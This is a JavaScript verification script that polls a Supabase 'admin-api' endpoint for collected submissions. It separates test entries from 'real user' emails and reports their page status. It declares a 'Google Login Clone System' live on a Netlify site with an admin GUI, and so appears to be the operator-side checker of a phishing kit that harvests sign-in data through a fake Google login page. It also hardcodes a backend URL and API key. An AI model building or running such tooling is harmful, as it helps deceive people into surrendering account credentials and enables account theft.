// FINAL VERIFICATION AFTER LIVE WEBSITE TEST
console.log('🔍 FINAL VERIFICATION - LIVE WEBSITE TEST RESULTS');
console.log('==========================================\n');

const SUPABASE_URL = 'https://nqsdardermkzppeaazbb.supabase.co';
const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc';

const headers = {
    'Authorization': `Bearer ${ANON_KEY}`,
    'apikey': ANON_KEY,
    'Content-Type': 'application/json'
};

async function finalVerification() {
    try {
        console.log('📊 Checking for new data from live website...\n');
        
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/pending`, { headers });
        
        if (!response.ok) {
            console.log('❌ Failed to fetch data from Supabase');
            return;
        }
        
        const data = await response.json();
        
        console.log('✅ CURRENT DATABASE STATUS:');
        console.log('==========================================');
        console.log('📊 Total Requests:', data.length);
        
        // Check for new data (non-test emails)
        const nonTestEmails = data.filter(req => 
            !req.email.includes('test') && 
            !req.email.includes('integration') &&
            !req.email.includes('frontend') &&
            !req.email.includes('live.website') &&
            !req.email.includes('example.com')
        );
        
        console.log('🌐 LIVE WEBSITE DATA:', nonTestEmails.length);
        
        if (nonTestEmails.length > 0) {
            console.log('🎉 SUCCESS! Live website is working!');
            console.log('');
            console.log('📧 REAL USER SUBMISSIONS:');
            nonTestEmails.slice(0, 3).forEach((req, index) => {
                console.log(`${index + 1}. ${req.email}`);
                console.log(`   📄 Page: ${req.pageStatus}`);
                console.log(`   🕐 Time: ${new Date(req.createdAt).toLocaleString()}`);
            });
        } else {
            console.log('⚠️ No live website data found yet');
            console.log('💡 This could mean:');
            console.log('   - Netlify deployment still in progress');
            console.log('   - Browser cache not cleared');
            console.log('   - User hasn\'t tested yet');
        }
        
        console.log('');
        console.log('🕒 LATEST 3 REQUESTS:');
        console.log('==========================================');
        
        data.slice(0, 3).forEach((req, index) => {
            const isTest = req.email.includes('test') || req.email.includes('example.com');
            const icon = isTest ? '🧪' : '🌐';
            console.log(`${icon} ${req.email}`);
            console.log(`   📄 ${req.pageStatus} | 🕐 ${new Date(req.createdAt).toLocaleString()}`);
        });
        
        console.log('');
        console.log('==========================================');
        console.log('📋 SYSTEM STATUS SUMMARY:');
        console.log('==========================================');
        console.log('✅ Supabase Backend: WORKING');
        console.log('✅ Edge Function admin-api: WORKING');  
        console.log('✅ Database Storage: WORKING');
        console.log('✅ Admin GUI Connection: WORKING');
        
        if (nonTestEmails.length > 0) {
            console.log('✅ Live Website: WORKING ✨');
            console.log('');
            console.log('🏆 CONGRATULATIONS!');
            console.log('🎯 Complete Google Login Clone System is LIVE!');
            console.log('🌐 Frontend: https://google-login-clone-demo.netlify.app');
            console.log('🛡️ Admin GUI: GUI Local/gui.html');
            console.log('📊 Database: 100% Operational');
        } else {
            console.log('⏳ Live Website: PENDING (waiting for first real submission)');
            console.log('');
            console.log('📝 NEXT STEPS:');
            console.log('1. Wait 2-3 more minutes for deployment');
            console.log('2. Clear browser cache (Ctrl+Shift+R)');
            console.log('3. Submit a test email on live website');
            console.log('4. Run this script again to verify');
        }
        
        console.log('==========================================');
        
    } catch (error) {
        console.log('❌ Error during verification:', error.message);
    }
}

finalVerification(); 